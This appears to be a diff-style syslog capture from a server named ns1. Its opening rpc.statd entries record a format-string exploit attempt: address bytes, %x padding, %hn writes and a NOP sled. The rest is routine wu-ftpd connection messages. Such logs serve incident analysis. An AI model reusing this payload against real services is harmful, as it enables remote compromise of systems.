+Jun  8 18:46:46 ns1 rpc.statd[501]: gethostbyname error for ^X÷ÿ¿^X÷ÿ¿^Z÷ÿ¿^Z÷ÿ¿%8x%8x%8x%8x%8x%8x%8x%8x%8x%62716x%hn%51859x%hn\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
+Jun  8 18:46:47 ns1 rpc.statd[501]: gethostbyname error for ^X÷ÿ¿^X÷ÿ¿^Z÷ÿ¿^Z÷ÿ¿%8x%8x%8x%8x%8x%8x%8x%8x%8x%62716x%hn%51859x%hn\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
+Jun 10 00:19:04 ns1 rpc.statd[501]: gethostbyname error for ^X÷ÿ¿^X÷ÿ¿^Z÷ÿ¿^Z÷ÿ¿%8x%8x%8x%8x%8x%8x%8x%8x%8x%62716x%hn%51859x%hn\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
+Jun 10 00:19:04 ns1 rpc.statd[501]: gethostbyname error for ^X÷ÿ¿^X÷ÿ¿^Z÷ÿ¿^Z÷ÿ¿%8x%8x%8x%8x%8x%8x%8x%8x%8x%62716x%hn%51859x%hn\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
+Jun 10 00:19:05 ns1 rpc.statd[501]: gethostbyname error for ^X÷ÿ¿^X÷ÿ¿^Z÷ÿ¿^Z÷ÿ¿%8x%8x%8x%8x%8x%8x%8x%8x%8x%62716x%hn%51859x%hn\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
+Jun 10 02:39:32 ns1 rpc.statd[501]: gethostbyname error for ^X÷ÿ¿^X÷ÿ¿^Z÷ÿ¿^Z÷ÿ¿%8x%8x%8x%8x%8x%8x%8x%8x%8x%62716x%hn%51859x%hn\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
+Jun 10 02:39:34 ns1 rpc.statd[501]: gethostbyname error for ^X÷ÿ¿^X÷ÿ¿^Z÷ÿ¿^Z÷ÿ¿%8x%8x%8x%8x%8x%8x%8x%8x%8x%62716x%hn%51859x%hn\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
+Jun 10 07:48:23 ns1 ftpd[9638]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:23 ns1 ftpd[9639]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:23 ns1 ftpd[9645]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:23 ns1 ftpd[9646]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:23 ns1 ftpd[9637]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:23 ns1 ftpd[9640]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:23 ns1 ftpd[9641]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:23 ns1 ftpd[9647]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:23 ns1 ftpd[9642]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:23 ns1 ftpd[9644]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:23 ns1 ftpd[9636]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:23 ns1 ftpd[9643]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:23 ns1 ftpd[9648]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:53 ns1 ftpd[9649]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:53 ns1 ftpd[9652]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:53 ns1 ftpd[9651]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:53 ns1 ftpd[9650]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:53 ns1 ftpd[9654]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:53 ns1 ftpd[9655]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:53 ns1 ftpd[9653]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:54 ns1 ftpd[9636]: FTP session closed
+Jun 10 07:48:56 ns1 ftpd[9656]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:48:56 ns1 ftpd[9657]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 07:49:02 ns1 ftpd[9641]: FTP session closed
+Jun 10 07:49:02 ns1 ftpd[9645]: FTP session closed
+Jun 10 07:49:02 ns1 ftpd[9647]: FTP session closed
+Jun 10 07:49:02 ns1 ftpd[9638]: FTP session closed
+Jun 10 07:49:02 ns1 ftpd[9637]: FTP session closed
+Jun 10 07:49:02 ns1 ftpd[9639]: FTP session closed
+Jun 10 07:49:02 ns1 ftpd[9644]: FTP session closed
+Jun 10 07:49:02 ns1 ftpd[9640]: FTP session closed
+Jun 10 07:49:02 ns1 ftpd[9646]: FTP session closed
+Jun 10 07:49:02 ns1 ftpd[9648]: FTP session closed
+Jun 10 07:49:02 ns1 ftpd[9642]: FTP session closed
+Jun 10 07:49:02 ns1 ftpd[9643]: FTP session closed
+Jun 10 07:49:17 ns1 ftpd[9649]: FTP session closed
+Jun 10 07:49:17 ns1 ftpd[9652]: FTP session closed
+Jun 10 07:49:17 ns1 ftpd[9650]: FTP session closed
+Jun 10 07:49:17 ns1 ftpd[9654]: FTP session closed
+Jun 10 07:49:17 ns1 ftpd[9653]: FTP session closed
+Jun 10 07:49:17 ns1 ftpd[9655]: FTP session closed
+Jun 10 07:49:17 ns1 ftpd[9651]: FTP session closed
+Jun 10 07:49:21 ns1 ftpd[9657]: FTP session closed
+Jun 10 07:49:21 ns1 ftpd[9656]: FTP session closed
+Jun 10 12:15:27 ns1 ftpd[9854]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:15:27 ns1 ftpd[9856]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:15:27 ns1 ftpd[9855]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:15:27 ns1 ftpd[9859]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:15:27 ns1 ftpd[9857]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:15:27 ns1 ftpd[9858]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:15:27 ns1 ftpd[9860]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:15:37 ns1 ftpd[9861]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:15:37 ns1 ftpd[9863]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:15:37 ns1 ftpd[9862]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:15:37 ns1 ftpd[9864]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:15:49 ns1 ftpd[9854]: FTP session closed
+Jun 10 12:15:57 ns1 ftpd[9858]: FTP session closed
+Jun 10 12:15:57 ns1 ftpd[9856]: FTP session closed
+Jun 10 12:15:57 ns1 ftpd[9855]: FTP session closed
+Jun 10 12:15:57 ns1 ftpd[9859]: FTP session closed
+Jun 10 12:15:57 ns1 ftpd[9857]: FTP session closed
+Jun 10 12:16:07 ns1 ftpd[9865]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:16:07 ns1 ftpd[9866]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:16:07 ns1 ftpd[9867]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:16:07 ns1 ftpd[9868]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:16:07 ns1 ftpd[9869]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:16:07 ns1 ftpd[9870]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:16:07 ns1 ftpd[9871]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:16:07 ns1 ftpd[9872]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:16:07 ns1 ftpd[9873]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:16:07 ns1 ftpd[9874]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:16:07 ns1 ftpd[9875]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:16:07 ns1 ftpd[9876]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 10 12:16:09 ns1 ftpd[9861]: FTP session closed
+Jun 10 12:16:09 ns1 ftpd[9863]: FTP session closed
+Jun 10 12:16:09 ns1 ftpd[9862]: FTP session closed
+Jun 10 12:16:10 ns1 ftpd[9864]: FTP session closed
+Jun 10 12:16:14 ns1 ftpd[9860]: FTP session closed
+Jun 10 12:16:39 ns1 ftpd[9866]: FTP session closed
+Jun 10 12:16:39 ns1 ftpd[9867]: FTP session closed
+Jun 10 12:16:39 ns1 ftpd[9865]: FTP session closed
+Jun 10 12:16:39 ns1 ftpd[9869]: FTP session closed
+Jun 10 12:16:39 ns1 ftpd[9868]: FTP session closed
+Jun 10 12:16:39 ns1 ftpd[9871]: FTP session closed
+Jun 10 12:16:39 ns1 ftpd[9872]: FTP session closed
+Jun 10 12:16:39 ns1 ftpd[9870]: FTP session closed
+Jun 10 12:16:39 ns1 ftpd[9874]: FTP session closed
+Jun 10 12:16:39 ns1 ftpd[9873]: FTP session closed
+Jun 10 12:16:40 ns1 ftpd[9875]: FTP session closed
+Jun 10 12:16:40 ns1 ftpd[9876]: FTP session closed
+Jun 11 14:53:11 ns1 ftpd[10806]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:11 ns1 ftpd[10808]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:11 ns1 ftpd[10810]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:11 ns1 ftpd[10801]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:11 ns1 ftpd[10802]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:11 ns1 ftpd[10803]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:11 ns1 ftpd[10804]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:11 ns1 ftpd[10813]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:11 ns1 ftpd[10811]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:12 ns1 ftpd[10807]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:12 ns1 ftpd[10805]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:12 ns1 ftpd[10809]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:12 ns1 ftpd[10812]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:28 ns1 ftpd[10809]: FTP session closed
+Jun 11 14:53:36 ns1 ftpd[10802]: FTP session closed
+Jun 11 14:53:36 ns1 ftpd[10811]: FTP session closed
+Jun 11 14:53:36 ns1 ftpd[10801]: FTP session closed
+Jun 11 14:53:36 ns1 ftpd[10806]: FTP session closed
+Jun 11 14:53:36 ns1 ftpd[10805]: FTP session closed
+Jun 11 14:53:36 ns1 ftpd[10808]: FTP session closed
+Jun 11 14:53:36 ns1 ftpd[10810]: FTP session closed
+Jun 11 14:53:36 ns1 ftpd[10812]: FTP session closed
+Jun 11 14:53:36 ns1 ftpd[10813]: FTP session closed
+Jun 11 14:53:36 ns1 ftpd[10807]: FTP session closed
+Jun 11 14:53:36 ns1 ftpd[10803]: FTP session closed
+Jun 11 14:53:36 ns1 ftpd[10804]: FTP session closed
+Jun 11 14:53:41 ns1 ftpd[10816]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:41 ns1 ftpd[10815]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:41 ns1 ftpd[10819]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:41 ns1 ftpd[10818]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:41 ns1 ftpd[10817]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:41 ns1 ftpd[10814]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:41 ns1 ftpd[10821]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:41 ns1 ftpd[10820]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:43 ns1 ftpd[10822]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:53:44 ns1 ftpd[10823]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 11 14:54:05 ns1 ftpd[10815]: FTP session closed
+Jun 11 14:54:05 ns1 ftpd[10816]: FTP session closed
+Jun 11 14:54:05 ns1 ftpd[10814]: FTP session closed
+Jun 11 14:54:05 ns1 ftpd[10817]: FTP session closed
+Jun 11 14:54:05 ns1 ftpd[10818]: FTP session closed
+Jun 11 14:54:05 ns1 ftpd[10819]: FTP session closed
+Jun 11 14:54:05 ns1 ftpd[10820]: FTP session closed
+Jun 11 14:54:05 ns1 ftpd[10821]: FTP session closed
+Jun 11 14:54:07 ns1 ftpd[10822]: FTP session closed
+Jun 11 14:54:08 ns1 ftpd[10823]: FTP session closed
+Jun 12 11:33:48 ns1 ftpd[11616]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 12 11:33:48 ns1 ftpd[11614]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 12 11:33:48 ns1 ftpd[11615]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 12 11:33:48 ns1 ftpd[11613]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 12 11:33:48 ns1 ftpd[11619]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 12 11:33:48 ns1 ftpd[11622]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 12 11:33:48 ns1 ftpd[11618]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 12 11:33:48 ns1 ftpd[11617]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 12 11:33:48 ns1 ftpd[11620]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 12 11:33:48 ns1 ftpd[11621]: wu-ftpd - TLS settings: control allow, client_cert allow, data allow
+Jun 12 11:34:13 ns1 ftpd[11618]: FTP session closed
+Jun 12 11:34:13 ns1 ftpd[11619]: FTP session closed
+Jun 12 11:34:13 ns1 ftpd[11617]: FTP session closed
+Jun 12 11:34:13 ns1 ftpd[11622]: FTP session closed
+Jun 12 11:34:13 ns1 ftpd[11620]: FTP session closed
+Jun 12 11:34:13 ns1 ftpd[11615]: FTP session closed
+Jun 12 11:34:13 ns1 ftpd[11613]: FTP session closed
+Jun 12 11:34:13 ns1 ftpd[11616]: FTP session closed
+Jun 12 11:34:13 ns1 ftpd[11614]: FTP session closed
+Jun 12 11:34:13 ns1 ftpd[11621]: FTP session closed
